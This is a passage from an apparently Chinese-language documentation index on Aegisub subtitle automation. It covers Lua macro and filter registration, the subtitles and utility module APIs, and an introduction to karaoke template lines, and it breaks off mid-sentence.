<ul> <li>\u5b8f\uff0c\u5373\u901a\u8fc7\u81ea\u52a8\u5316\u83dc\u5355\u4e2d\u70b9\u51fb\u8c03\u7528\uff0c\u901a\u8fc7 register_macro \u6ce8\u518c</li> <li>\u5bfc\u51fa\u6ee4\u955c\uff0c\u5728 Export As \u5bfc\u51fa\u811a\u672c\u65f6\u53ef\u9009\u62e9\u542f\u7528\u6ee4\u955c\uff0c\u901a\u8fc7 register_filter \u6ce8\u518c</li> </ul> <p>\u6240\u4ee5\u7b80\u5355\u6765\u8bb2\u4e00\u4e2a\u81ea\u52a8\u5316\u811a\u672c\u7684\u7ed3\u6784\u53ef\u4ee5\u662f\uff1a</p> <pre><code>script_name = \"...\"\nscript_description = \"...\"\nscript_author = \"...\"\nscript_version = \"...\"\n-- \u4e0a\u9762\u8fd9\u4e9b\u662f\u811a\u672c\u5143\u6570\u636e\uff0caegisub \u4f1a\u8bfb\u53d6\u5e76\u663e\u793a\u5728\u83dc\u5355\u4e2d\n\ninclude(\"unicode.lua\")\n\nfunction macro_function(subtitles, selected_lines, active_line)\n    -- do something\nend\n\naegisub.register_macro(script_name, script_description, macro_function)\n</code></pre> aegisub.register_macro(name, desc, func, validator, is_active_func) <ul> <li>name\uff1a\u811a\u672c\u540d\u79f0\uff0c\u663e\u793a\u5728\u81ea\u52a8\u5316\u83dc\u5355\u91cc\uff0c\u5982\u679c\u6709 / \u5219\u5206\u5272\u4e3a\u5b50\u83dc\u5355\u680f</li> <li>desc\uff1a\u811a\u672c\u63cf\u8ff0\uff0c\u9f20\u6807\u60ac\u6d6e\u65f6\u663e\u793a</li> <li>func\uff1a\u70b9\u51fb\u811a\u672c\u540d\u79f0\u65f6\u8c03\u7528\u7684\u51fd\u6570\uff0c\u4f1a\u4f20\u5165\u4ee5\u4e0b\u4e09\u4e2a\u53c2\u6570<ul> <li>subtitles\uff1a\u5168\u90e8\u5b57\u5e55\u884c\uff0c\u53ef\u4ee5\u4fee\u6539</li> <li>selected_lines\uff1a\u9009\u4e2d\u7684\u5b57\u5e55\u884c\uff0c\u4e00\u4e2a table\uff0c\u53ef\u4ee5\u904d\u5386\uff0c\u5143\u7d20\u662f subtitles \u4e2d\u7f16\u53f7</li> <li>active_line\uff1a\u5f53\u524d\u884c\uff0c\u4e00\u4e2a number</li> </ul> </li> <li>validator\uff1a\u811a\u672c\u6821\u9a8c\u51fd\u6570\uff0c\u8fd4\u56de true/false\uff0c\u5982\u679c\u8fd4\u56de false \u5219\u4e0d\u53ef\u7528\uff0c\u53c2\u6570\u540c func</li> <li>is_active_func\uff1a\u662f\u5426\u6d3b\u8dc3\uff0c\u7c7b\u4f3c validator\uff0c\u4e0d\u5e38\u7528</li> </ul> aegisub.register_filter(name, desc, priority, func, panel_provider) <ul> <li>name desc \u548c macro \u4e00\u6837</li> <li>priority\uff1a\u9009\u4e2d\u591a\u4e2a\u6ee4\u955c\u65f6\u7684\u5e94\u7528\u4f18\u5148\u7ea7\uff0c\u8d8a\u5927\u8d8a\u4f18\u5148</li> <li>func\uff1a\u65bd\u52a0\u6ee4\u955c\u65f6\u8c03\u7528\u7684\u51fd\u6570\uff0c\u4f20\u5165\u4e24\u4e2a\u53c2\u6570<ul> <li>subtitles\uff1a\u5168\u90e8\u5b57\u5e55\u884c</li> <li>settings\uff1a\u6765\u81ea panel \u7684\u8bbe\u7f6e\uff0c\u6ca1\u6709 panel \u5219\u7a7a</li> </ul> </li> <li>panel_provider\uff1a\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u6765\u5b9a\u4e49\u914d\u7f6e\u9762\u677f</li> </ul> aegisub.set_undo_point(name) \u8bbe\u7f6e\u64a4\u9500\u70b9\uff0cname \u4e3a\u64a4\u9500\u70b9\u540d\u79f0\uff0c\u53ef\u4ee5\u5728\u64a4\u9500\u5386\u53f2\u4e2d\u770b\u5230\uff0cCtrl-Z \u64a4\u9500\u51fd\u6570\u6548\u679c\u3002 aegisub.cancel() \u53d6\u6d88\u5f53\u524d\u64cd\u4f5c\uff0c\u56de\u6eda\u6240\u6709\u66f4\u6539\u3002 Aegisub \u81ea\u5e26\u793a\u4f8b <p>\u770b\u81ea\u5e26\u7684\u811a\u672c\u793a\u4f8b\u66f4\u6e05\u6670\uff0c\u6bd4\u5982\u5728\u6bcf\u884c\u524d\u52a0 {\\be1} \u6807\u7b7e\uff1a</p> <pre><code>local tr = aegisub.gettext\n\nscript_name = tr\"Add edgeblur\"\nscript_description = tr\"A demo macro showing how to do simple line modification in Automation 4\"\nscript_author = \"Niels Martin Hansen\"\nscript_version = \"1\"\n\nfunction add_edgeblur(subtitles, selected_lines, active_line)\n    for z, i in ipairs(selected_lines) do\n        local l = subtitles[i]\n        l.text = \"{\\\\be1}\" .. l.text\n        subtitles[i] = l\n    end\n    aegisub.set_undo_point(script_name)\nend\n\naegisub.register_macro(script_name, tr\"Adds \\\\be1 tags to all selected lines\", add_edgeblur)\n</code></pre> <p>\u5176\u4e2d tr \u5373 aegisub.gettext \u7528\u6765\u56fd\u9645\u5316\uff0c\u81ea\u5df1\u7528\u53ef\u6709\u53ef\u65e0\u3002</p>"},{"location":"others/subs/aegisub/automation/#api","title":"API \u53ca\u90e8\u5206\u81ea\u5e26\u6a21\u5757","text":""},{"location":"others/subs/aegisub/automation/#subtitles-api","title":"subtitles API","text":"<p>\u4f20\u5165\u7684 subtitles \u662f\u6240\u6709\u884c\uff0c\u4e0d\u4ec5\u5305\u62ec\u5b57\u5e55\u884c\uff08[Events]\uff09\uff0c\u8fd8\u6709\u811a\u672c\u4fe1\u606f\u884c\uff08[Script Info]\uff09\u548c\u6837\u5f0f\u884c\uff08[V4+ Styles]\uff09\uff0c\u6240\u4ee5\u7d22\u5f15\u65e2\u4e0d\u662f\u5b57\u5e55\u884c\u7684\u884c\u53f7\uff0c\u4e5f\u4e0d\u662f ass \u6587\u4ef6\u4e2d\u7684\u7269\u7406\u884c\u53f7\u3002\u603b\u884c\u6570\u53ef\u4ee5\u7528 #subtitles \u8bfb\u53d6\u3002</p>"},{"location":"others/subs/aegisub/automation/#subtitles","title":"subtitles \u64cd\u4f5c","text":"<p>\u5728 macro function \u4e2d subtitles \u662f\u53ef\u4fee\u6539\u7684\uff0c\u800c validator \u4e00\u7c7b\u4e2d\u662f\u53ea\u8bfb\u7684\u3002\u6709\u4ee5\u4e0b\u64cd\u4f5c\uff1a</p> <ul> <li>\u8bfb\u53d6\u884c\uff1a<code>line = subtitles[i]</code>\uff0cline \u4e3a\u4e00\u4e2a table\uff0c\u5185\u5bb9\u4e0b\u9762\u4ecb\u7ecd</li> <li>\u9644\u52a0\u884c\uff1a\u6dfb\u52a0\u5230\u6587\u4ef6\u672b\u5c3e<ul> <li><code>subtitles[0] = line</code> \u7d22\u5f15 0 \u5c31\u8868\u793a\u9644\u52a0</li> <li><code>subtitles.append(line1, line2, ...)</code> \u53ef\u4ee5\u6dfb\u52a0\u591a\u884c</li> </ul> </li> <li>\u63d2\u5165\u884c\uff1a\u5728\u539f\u7b2c i \u884c\u524d\u63d2\u5165\u65b0\u884c<ul> <li><code>subtitles[-i] = line</code> \u7d22\u5f15\u8d1f\u6570\u8868\u793a\u63d2\u5165</li> <li><code>subtitles.insert(i, line1, line2, ...)</code></li> </ul> </li> <li>\u66ff\u6362\u884c\uff1a<code>subtitles[i] = line</code></li> <li>\u5220\u9664\u884c\uff1a<ul> <li><code>subtitles[i] = nil</code></li> <li><code>subtitles.delete(i1, i2, ...)</code></li> <li><code>subtitles.delete({i1, i2, ...})</code></li> <li><code>subtitles.deleterange(a, b)</code> \u95ed\u533a\u95f4\u884c\u53f7</li> </ul> </li> </ul>"},{"location":"others/subs/aegisub/automation/#subtitles_1","title":"subtitles \u884c\u6570\u636e","text":"<p>\u8bfb\u53d6\u5230\u7684 subtitles \u6bcf\u4e00\u884c line \u662f\u4e00\u4e2a table\uff0c\u5305\u542b\u4ee5\u4e0b\u952e\uff1a</p> <ul> <li>class\uff1a\u4e00\u4e2a string\uff0c\u8868\u793a\u7c7b\u578b\uff0c\u5305\u62ec info style dialogue unknown</li> <li>raw\uff1a\u4e00\u4e2a string\uff0c\u8868\u793a\u5728 ass \u6587\u4ef6\u4e2d\u5bf9\u5e94\u884c\u7684\u539f\u59cb\u5185\u5bb9</li> <li>section\uff1a\u4e00\u4e2a string\uff0c\u8868\u793a\u5728 ass \u6587\u4ef6\u4e2d\u6240\u5c5e\u7684\u90e8\u5206\uff08\"[Script Info]\" \u4e00\u7c7b\uff09</li> <li>\u4e0d\u540c\u7c7b\u578b\u7684\u7279\u5b9a\u5185\u5bb9\uff1a<ul> <li>info \u7c7b\u578b\uff1a<ul> <li>key \u548c value\uff0c\u90fd\u662f string\uff0c\u5f53\u524d\u884c\u7684\u4fe1\u606f</li> </ul> </li> <li>style \u7c7b\u578b\uff1a<ul> <li>name fontname fontsize bold italic \u7b49\u6837\u5f0f\u8bbe\u7f6e</li> <li>color1 color2 color3 color4 \u7b49\u989c\u8272\uff0c\u53ef\u7528 extract_color \u89e3\u6790\u8bfb\u53d6</li> </ul> </li> <li>dialogue \u7c7b\u578b\uff1a<ul> <li>comment\uff1a\u4e00\u4e2a boolean\uff0c\u8868\u793a\u662f\u5426\u662f\u6ce8\u91ca\u884c</li> <li>layer start_time end_time style actor effect \u7b49\u5b57\u5e55\u884c\u8bbe\u7f6e</li> <li>margin_l ..._r ..._t ..._b\uff1a\u8986\u76d6\u7684 margin\uff0c\u4e3a 0 \u5219\u8868\u793a\u7528 style \u9ed8\u8ba4\u7684</li> <li>text\uff1a\u5b57\u5e55\u5185\u5bb9</li> </ul> </li> </ul> </li> </ul>"},{"location":"others/subs/aegisub/automation/#api_1","title":"\u5176\u4ed6\u5e38\u7528 API","text":"aegisub.progress.set(percent) \u8bbe\u7f6e\u6267\u884c\u8fdb\u5ea6\u6761\u7684\u767e\u5206\u6bd4\uff080-100\uff09\u3002 aegisub.progress.task(fmt_str, ...) \u5728\u8fdb\u5ea6\u6761\u4e0b\u9762\u663e\u793a\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u4efb\u52a1\uff0c\u53c2\u6570\u7b2c\u4e00\u4e2a\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u540e\u9762\u662f\u683c\u5f0f\u5316\u7684\u53c2\u6570\u3002 aegisub.progress.title(fmt_str, ...) \u8bbe\u7f6e\u8fdb\u5ea6\u7a97\u53e3\u7684\u6807\u9898\uff0c\u4e5f\u662f\u5229\u7528 string.format\u3002 aegisub.progress.is_cancelled() \u8fd4\u56de\u4e00\u4e2a boolean \u8868\u793a\u7528\u6237\u662f\u5426\u70b9\u51fb\u4e86\u8fdb\u5ea6\u7a97\u53e3\u4e2d\u7684\u53d6\u6d88\u6309\u94ae\u3002 aegisub.debug.out(level, fmt_str, ...) <p>\u7528\u4e8e\u8f93\u51fa\uff0c\u53ef\u4ee5\u5199\u4e3a aegisub.log\uff0clevel \u53ef\u4ee5\u7701\u7565\uff08\u7701\u7565\u7684\u8bdd\u5219\u59cb\u7ec8\u663e\u793a\uff09\u3002</p> <p>level 0-5 \u4f9d\u6b21\u8868\u793a fatal error warning hint debug trace\uff0c\u5728 Preferences \u91cc\u9762\u53ef\u4ee5\u9009\u62e9\u81ea\u52a8\u5316\u663e\u793a\u7684\u8f93\u51fa\u7b49\u7ea7\u3002</p> aegisub.text_extends(style, text) <p>\u6839\u636e\u6837\u5f0f\u83b7\u53d6\u6587\u5b57\u6e32\u67d3\u540e\u7684\u4fe1\u606f\uff0cstyle \u662f\u4e00\u4e2a table\uff08subtitles API \u4e2d\u7684\u90a3\u6837\uff09\uff0ctext \u662f string\u3002\u8fd4\u56de\u4ee5\u4e0b\u56db\u4e2a\u6570\u5b57\uff08\u50cf\u7d20\u4e3a\u5355\u4f4d\uff09\uff1a</p> <ul> <li>width height\uff1a\u6587\u5b57\u6e32\u67d3\u540e\u7684\u5bbd\u9ad8</li> <li>descent ext_lead\uff1a\u6587\u5b57\u6e32\u67d3\u540e\u7684 descent \u548c leading</li> </ul> aegisub.frame_from_ms(ms) / aegisub.ms_from_frame(frame) \u6839\u636e\u89c6\u9891\u7684\u5e27\u901f\u7387\u5c06\u6beb\u79d2\u548c\u5e27\u53f7\u76f8\u4e92\u8f6c\u6362\u3002\u6ca1\u6709\u5e27\u901f\u7387\u76f8\u5173\u4fe1\u606f\u7684\u65f6\u5019\u8fd4\u56de nil\u3002 aegisub.video_size() <p>\u8fd4\u56de\u56db\u4e2a\u503c\uff1a</p> <ul> <li>xres yres\uff1a\u5206\u8fa8\u7387\uff08\u50cf\u7d20\u5355\u4f4d\uff09</li> <li>ar artype\uff1a\u5bbd\u9ad8\u6bd4\uff0cartype \u4e3a 0 \u65b9\u5f62\u30011 \u4e3a 4:3\u30012 \u4e3a 16:9\u30013 \u4e3a 2.35\u30014 \u4e3a ar \u8868\u793a\u7684\u5bbd\u9ad8\u6bd4</li> </ul> aegisub.keyframes() \u83b7\u53d6\u5173\u952e\u5e27\u5e27\u53f7\u8868\uff0c\u5373\u4e00\u4e2a\u6392\u5e8f\u597d\u7684\u6570\u7ec4\u3002\u672a\u52a0\u8f7d\u5173\u952e\u5e27\u5219\u4e3a\u7a7a\u3002"},{"location":"others/subs/aegisub/automation/#util","title":"util \u6a21\u5757","text":"<p>\u901a\u8fc7 <code>include(\"util.lua\")</code> \u6216\u8005 <code>util = require \"aegisub.util\"</code> \u5f15\u5165\u3002</p> <ul> <li>\u8868\u62f7\u8d1d\u76f8\u5173<ul> <li><code>util.copy(t)</code> \u8fd4\u56de\u4e00\u4e2a\u8868\u7684\u6d45\u62f7\u8d1d</li> <li><code>util.deep_copy(t)</code> \u8fd4\u56de\u4e00\u4e2a\u8868\u7684\u6df1\u62f7\u8d1d</li> </ul> </li> <li>\u989c\u8272\u76f8\u5173<ul> <li><code>util.ass_color(r, g, b)</code> \u8fd4\u56de ass \u989c\u8272\u5b57\u7b26\u4e32</li> <li><code>util.ass_style_color(r, g, b, a)</code> \u8fd4\u56de ass \u6837\u5f0f\u7684\u989c\u8272\u5b57\u7b26\u4e32</li> <li><code>util.ass_alpha(a)</code> \u8fd4\u56de alpha \u5b57\u7b26\u4e32\uff08&amp;HAA&amp;\uff09</li> <li><code>util.extract_color(str)</code> \u6839\u636e\u5b57\u7b26\u4e32\u89e3\u6790\u989c\u8272<ul> <li>\u8fd4\u56de\u56db\u4e2a\u503c\u5206\u522b\u8868\u793a r g b a</li> <li>\u53ef\u4ee5\u89e3\u6790 ass \u6837\u5f0f\u989c\u8272\u3001\u884c\u5185\u989c\u8272\u3001\u884c\u5185\u900f\u660e\u5ea6\u4ee5\u53ca #RRGGBBAA \u683c\u5f0f\u7684\u5b57\u7b26\u4e32</li> <li>\u6837\u5f0f\u5185\u4e0d\u5305\u542b\u7684\u90e8\u5206\u8fd4\u56de 0\uff0c\u89e3\u6790\u9519\u8bef\u8fd4\u56de nil</li> </ul> </li> <li><code>util.alpha_from_style(str)</code> extract_color \u548c ass_alpha \u7ec4\u5408</li> <li><code>util.color_from_style(str)</code> extract_color \u548c ass_color \u7ec4\u5408</li> <li><code>util.HSV_to_RGB(h, s, v)</code> h \u5728 [0, 360)\u3001s v \u5728 [0, 1]\uff0c\u8fd4\u56de r g b \u5728 [0, 256)</li> <li><code>util.interpolate_color(t, color1, color2)</code> \u5728\u989c\u8272\u95f4\u63d2\u503c\uff0ct \u5728 [0, 1] \u8303\u56f4\u5185\uff0ccolor1 color2 \u548c\u8fd4\u56de\u503c\u90fd\u662f\u989c\u8272\u5b57\u7b26\u4e32</li> <li><code>util.interpolate_alpha(t, alpha1, alpha2)</code> \u5728\u900f\u660e\u5ea6\u95f4\u63d2\u503c\uff0c\u540c\u4e0a</li> </ul> </li> <li>\u5b57\u7b26\u4e32\u6269\u5c55<ul> <li><code>util.trim(str)</code> \u79fb\u9664\u9996\u5c3e\u7a7a\u683c</li> <li><code>util.headtail(str)</code> \u6309\u7167\u7b2c\u4e00\u4e2a\u7a7a\u683c\u5206\u5272\uff0c\u8fd4\u56de\u524d\u540e\u4e24\u4e2a\u90e8\u5206\u5b57\u7b26\u4e32</li> <li><code>util.words(str)</code> \u8fd4\u56de\u8fed\u4ee3\u5668\uff0c\u76f8\u5f53\u4e8e\u7528 headtail \u591a\u6b21\uff08\u5373 split\uff09</li> <li>\u4ee5\u4e0a\u5b57\u7b26\u4e32\u6269\u5c55\u90fd\u53ef\u4ee5\u5c06 util \u6539\u4e3a string</li> </ul> </li> <li>\u6570\u5b66\u51fd\u6570<ul> <li><code>util.clamp(val, min, max)</code> \u5c06 val \u7ea6\u675f\u5728 min \u5230 max \u95f4</li> <li><code>util.interpolate(t, a, b)</code> \u5728 [a, b] \u95f4\u63d2\u503c\uff0ct \u4e3a\u6bd4\u4f8b\u5728 [0, 1] \u8303\u56f4\u5185</li> </ul> </li> </ul>"},{"location":"others/subs/aegisub/automation/#unicode","title":"unicode \u6a21\u5757","text":"<p>Lua \u7684 string \u662f\u5b57\u8282\u5e8f\u5217\uff0caegisub \u63d0\u4f9b\u4e86 unicode \u6a21\u5757\u6765\u5904\u7406 UTF-8 \u5b57\u7b26\u4e32\u3002\u901a\u8fc7 <code>include(\"unicode.lua\")</code> \u6216\u8005 <code>unicode = require \"aegisub.unicode\"</code> \u5f15\u5165\u3002</p> <ul> <li><code>unicode.charwidth(str, index)</code> \u5b57\u7b26\u4e32 str \u7b2c index \u5f00\u59cb\u7684\u5b57\u8282\u8868\u793a\u7684\u5b57\u7b26\u6240\u5360\u5b57\u8282\u6570</li> <li><code>unicode.chars(str)</code> \u8fd4\u56de\u8fed\u4ee3\u5668\uff0c\u7528\u6765\u904d\u5386 UTF-8 \u5b57\u7b26\u4e32\u5185\u6240\u6709\u5b57\u7b26</li> <li><code>unicode.len(str)</code> \u5b57\u7b26\u4e2a\u6570</li> <li><code>unicode.codepoint(str)</code> str \u4e2d\u9996\u5b57\u7b26\u7684\u7801\u4f4d</li> <li><code>unicode.to_upper_case(str) .to_lower_case .to_fold_case</code></li> </ul>"},{"location":"others/subs/aegisub/automation/#clipboard","title":"clipboard \u6a21\u5757","text":"<p>\u901a\u8fc7 <code>include(\"clipboard.lua\")</code> \u6216\u8005 <code>clipboard = require \"aegisub.clipboard\"</code> \u5f15\u5165\u3002</p> <ul> <li><code>clipboard.set(str)</code> \u8bbe\u7f6e\u526a\u8d34\u677f\u5185\u5bb9\uff0c\u6210\u529f\u8fd4\u56de true \u5426\u5219\u8fd4\u56de false</li> <li><code>clipboard.get()</code> \u83b7\u53d6\u526a\u8d34\u677f\u5185\u5bb9\uff0c\u4e0d\u5305\u542b\u6587\u672c\u6216\u53d1\u751f\u9519\u8bef\u8fd4\u56de nil</li> </ul>"},{"location":"others/subs/aegisub/automation/#re","title":"re \u6a21\u5757","text":"<p>Lua string \u7684\u6a21\u5f0f\u5339\u914d\u529f\u80fd\u8f83\u5c11\uff0cre \u6a21\u5757\u5c01\u88c5\u4e86 boost::regex \u5b9e\u73b0 PRCE \u6807\u51c6\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u3002\u901a\u8fc7 <code>include(\"re.lua\")</code> \u6216\u8005 <code>re = require \"aegisub.re\"</code> \u5f15\u5165\u3002\u4f46\u5b9e\u9645\u611f\u89c9\u5176\u5b9e\u4e5f\u5e76\u4e0d\u597d\u7528\uff0c\u8fd9\u91cc\u5c31\u4e0d\u5199\u4e86\u3002</p>"},{"location":"others/subs/aegisub/karaoke/","title":"Aegisub \u5361\u62c9 OK \u7279\u6548\u6a21\u677f","text":"<p> \u7ea6 3086 \u4e2a\u5b57  14 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p> <p>Abstract</p> <p>ass \u5b57\u5e55\u5185\u7684 k \u8f74\u6548\u679c\u975e\u5e38\u6709\u9650\uff0c\u901a\u8fc7 Aegisub \u81ea\u5e26\u7684 kara-templater \u81ea\u52a8\u5316\u811a\u672c\u914d\u5408\u4e00\u4e9b\u6a21\u677f\u884c\u53ef\u4ee5\u5b9e\u73b0 k \u8f74\u90e8\u5206\u7684\u66ff\u6362\uff0c\u4ee5\u5b9e\u73b0\u66f4\u4e30\u5bcc\u7684\u6548\u679c\u3002</p>"},{"location":"others/subs/aegisub/karaoke/#ok-k","title":"\u5361\u62c9 OK \u6807\u7b7e\uff08k \u8f74\uff09","text":"<p>\u6709 \\k \\kf\uff08\u540c \\K\uff09\\ko \u4e09\u79cd\u884c\u5185\u7279\u6548\u6807\u7b7e\uff0c\u4e00\u53e5\u6253\u597d\u7684 k \u8f74\u7c7b\u4f3c\u5982\u4e0b\u683c\u5f0f\uff1a</p> <pre><code>{\\k56}a{\\k55}b{\\k56}c{\\k55}d{\\k56}e{\\k55}f{\\k56}g{\\k55}h{\\k56}i\n</code></pre> <p>\u88ab \\k \u7cfb\u5217\u7279\u6548\u6807\u7b7e\u5206\u9694\u7684\u79f0\u4e3a\u97f3\u8282\uff08syllable\uff09\uff0c\u6bcf\u4e2a\u97f3\u8282\u524d\u9762\u7684 {\\k&lt;number&gt;} \u8868\u793a\u8be5\u97f3\u8282\u6301\u7eed\u7684\u65f6\u95f4\uff0c\u4ee5\u5398\u79d2\uff08\u767e\u5206\u4e4b\u4e00\u79d2\uff09\u4e3a\u5355\u4f4d\u3002\u8fd9\u4e2a\u8f74\u53ef\u4ee5\u4f7f\u7528 Aegisub \u5e26\u7684\u5361\u62c9 OK \u6a21\u5f0f\u6765\u6253\u3002</p> <p>\u9ed8\u8ba4\u7684\u4e09\u79cd k \u6807\u7b7e\u7684\u6548\u679c\u5982\u4e0b\uff1a</p> <ul> <li>\\k \u5df2\u7ecf\u5f00\u59cb\u7684\u97f3\u8282\u663e\u793a\u4e3a\u4e3b\u8981\u989c\u8272\uff0c\u672a\u5f00\u59cb\u7684\u97f3\u8282\u663e\u793a\u4e3a\u6b21\u8981\u989c\u8272\uff08\u7a81\u53d8\uff09</li> <li>\\kf \\K \u5728\u97f3\u8282\u7684\u65f6\u95f4\u8303\u56f4\u5185\u4ece\u5de6\u5230\u53f3\u4ece\u6b21\u8981\u989c\u8272\u53d8\u4e3a\u4e3b\u8981\u989c\u8272</li> <li>\\ko \u548c \\k \u7684\u5dee\u522b\u5728\u4e8e\u672a\u5f00\u59cb\u7684\u97f3\u8282\u65e0\u8fb9\u6846</li> </ul> <p>\u53ef\u89c1\u9ed8\u8ba4\u7684\u6548\u679c\u975e\u5e38\u5c11\uff0c\u4f46\u5982\u679c\u80fd\u5c06\u6bcf\u4e2a\u97f3\u8282\u5230\u6765\u7684\u65f6\u95f4\u7b49\u8ba1\u7b97\u51fa\u6765\uff0c\u518d\u914d\u5408 \\t \u52a8\u753b\u6807\u7b7e\u7b49\u81ea\u52a8\u5316\u5730\u586b\u5145\u5230\u97f3\u8282\u524d\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u66f4\u590d\u6742\u7684\u6548\u679c\u4e86\u3002Aegisub \u7684 kara-templater \u81ea\u52a8\u5316\u811a\u672c\u5c31\u662f\u8fdb\u884c\u8fd9\u4e2a\u5de5\u4f5c\uff0c\u8fd8\u9644\u5e26\u4e86\u6267\u884c lua \u811a\u672c\u7b49\u529f\u80fd\u3002</p>"},{"location":"others/subs/aegisub/karaoke/#_1","title":"\u7279\u6548\u6a21\u677f\u57fa\u672c\u5de5\u4f5c\u539f\u7406","text":"<p>kara-template \u4e3b\u8981\u6839\u636e\u6bcf\u4e00\u5b57\u5e55\u884c\u7684 Effect \u5373\u7279\u6548\u90e8\u5206\u6765\u8bc6\u522b\u4e0e\u5176\u76f8\u5173\u7684\u7279\u6548\u884c\u3002\u4e3b\u8981\u5206\u4e3a\u4e24\u5927\u7c7b\uff1a</p> <ul> <li>template \u884c\uff1a\u7279\u6548\u90e8\u5206\u6309\u7a7a\u683c\u5206\u9694\u7b2c\u4e00\u4e2a\u5355\u8bcd\u4e3a template\uff0c\u4e14\u8be5\u884c\u6807\u8bb0\u4e3a\u6ce8\u91ca</li> <li>code \u884c\uff1a\u7279\u6548\u90e8\u5206\u6309\u7a7a\u683c\u5206\u9694\u7b2c\u4e00\u4e2a\u5355\u8bcd\u4e3a code\uff0c\u4e14\u8be5\u884c\u6807\u8bb0\u4e3a\u6ce8\u91ca</li> </ul> <p>\u56e0\u4e3a\u6807\u8bb0\u4e3a\u4e86\u6ce8\u91ca\uff0c\u6240\u4ee5\u5728\u6e32\u67d3\u65f6\u4e0d\u4f1a\u6709\u4efb\u4f55\u4f5c\u7528\uff0c\u5b83\u4eec\u7684\u7528\u5904\u53ea\u6709\u5728\u6267\u884c kara-templater \u811a\u672c\u65f6\u88ab\u8bfb\u53d6\u3002</p> <p>\u8fd9\u4e24\u79cd\u7279\u6548\u884c\u7684\u6548\u679c\u6216\u8005\u8bf4\u7528\u5904\u662f\uff1a</p> <ul> <li>template\uff1a\u6a21\u677f\uff0c\u987e\u540d\u601d\u4e49\u5b83\u4f1a\u7528\u6765\u66ff\u6362\u6240\u6709 {\\k&lt;number&gt;} \u6807\u7b7e</li> <li>code\uff1a\u4ee3\u7801\uff0c\u4e0d\u4f1a\u8fdb\u884c\u5b9e\u9645\u7684\u66ff\u6362\uff0c\u4f46\u91cc\u9762\u7684 lua \u4ee3\u7801\u4f1a\u88ab\u6267\u884c\uff0c\u4e00\u822c\u7528\u6765\u5b9a\u4e49\u4e00\u4e9b\u53d8\u91cf/\u51fd\u6570\u7559\u5230 template \u4e2d\u4f7f\u7528</li> </ul> <p>\u90a3\u5b83\u4eec\u80af\u5b9a\u4e5f\u4e0d\u4f1a\u6b8b\u66b4\u5730\u66ff\u6362\u6574\u4e2a ass \u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5e26 k \u8f74\u7684\u90e8\u5206\uff0c\u5b83\u4eec\u7684\u4f5c\u7528\u8303\u56f4\u662f\u4ec5\u548c\u5b83\u4eec\u5c5e\u4e8e\u76f8\u540c\u6837\u5f0f\u7684\u5b57\u5e55\u884c\uff0c\u4e14\u8fd9\u4e2a\u884c\u6709\u4e24\u79cd\u60c5\u51b5\uff1a</p> <ul> <li>Effect \u90e8\u5206\u4e3a\u7a7a\u4e14\u4e0d\u662f\u6ce8\u91ca\u884c</li> <li>Effect \u90e8\u5206\u4e3a karaoke \u6216\u8005 Karaoke\uff0c\u4e0d\u8bba\u662f\u4e0d\u662f\u6ce8\u91ca\u884c</li> </ul> <p>\u4e5f\u5c31\u662f\u8bf4\u5728\u6267\u884c kara-templater \u811a\u672c\u65f6\uff0c\u4f1a\u5148\u6536\u96c6\u5b57\u5e55\u4e2d\u7684\u5168\u90e8 template \u548c code\uff0c\u7136\u540e\u5904\u7406\u6309\u7167\u4e0a\u8ff0\u89c4\u5219\u5339\u914d\u7684\u884c\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u9700\u8981\u5904\u7406\u7684\u884c\u6309\u987a\u5e8f\u4f9d\u6b21\u6267\u884c template \u6216 code\uff08\u987a\u5e8f\u5c31\u662f\u5728\u6587\u4ef6\u4e2d\u51fa\u73b0\u7684\u987a\u5e8f\uff09\uff0c\u5bf9\u4e8e code \u5c31\u653e\u5230 lua \u73af\u5883\u4e2d\u6267\u884c\uff0c\u5bf9\u4e8e template\uff1a</p> <ul> <li>\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u884c\uff0c\u7279\u6548\u6807\u8bb0\u4e3a fx\uff0c\u5c06\u539f\u5b57\u5e55\u4e2d\u7684 k \u6807\u7b7e\u9010\u4e2a\u66ff\u6362\u4e3a template \u884c\u5185\u5bb9</li> <li>\u5904\u7406\u597d\u540e\u5c06\u539f\u5b57\u5e55\u884c\u6807\u8bb0\u4e3a\u6ce8\u91ca\uff0c\u5c06\u7279\u6548\u8bbe\u7f6e\u4e3a karaoke</li> </ul> <p>\u8fd9\u6837\u7684\u6548\u679c\u5c31\u662f\u518d\u6b21\u6267\u884c\u811a\u672c\u7684\u65f6\u5019\u6240\u6709\u7279\u6548\u4e3a fx \u7684\u884c\u4f1a\u88ab\u5220\u9664\uff0c\u7136\u540e\u7279\u6548\u4e3a karaoke \u7684\u6ce8\u91ca\u884c\u4f1a\u7528\u6765\u751f\u6210\u65b0\u7684 fx \u884c\uff0c\u4ee5\u8fbe\u5230\u66f4\u65b0\u7684\u6548\u679c\u3002</p>"},{"location":"others/subs/aegisub/karaoke/#_2","title":"\u7279\u6548\u6a21\u677f\u8be6\u7ec6\u7528\u6cd5","text":""},{"location":"others/subs/aegisub/karaoke/#_3","title":"\u6a21\u677f\u4fee\u9970\u8bed","text":"<p>\u53ea\u6709 template \u548c code \u4e24\u79cd\u8fd8\u662f\u592a\u5c11\u4e86\uff0c\u4f46\u4f5c\u4e3a\u57fa\u672c\u529f\u80fd\u8fd8\u662f\u591f\u7684\uff08\u4e00\u4e2a\u5b9e\u9645\u66ff\u6362\uff0c\u4e00\u4e2a\u4f5c\u51c6\u5907\uff09\u3002\u6240\u4ee5\u52a0\u4e86\u4fee\u9970\u8bed\u7684\u6982\u5ff5\uff0c\u8ba9\u8fd9\u4e8c\u8005\u7684\u6548\u679c\u6709\u4e86\u66f4\u591a\u79cd\u7684\u53d8\u5316\u3002</p> <p>\u5728\u6ca1\u6709\u4fee\u9970\u8bed\u7684\u60c5\u51b5\u4e0b\uff0ctemplate \u9ed8\u8ba4\u5e26 syl\uff0ccode \u9ed8\u8ba4\u5e26 once\u3002</p> once \u53ea\u80fd\u7528\u5728 code 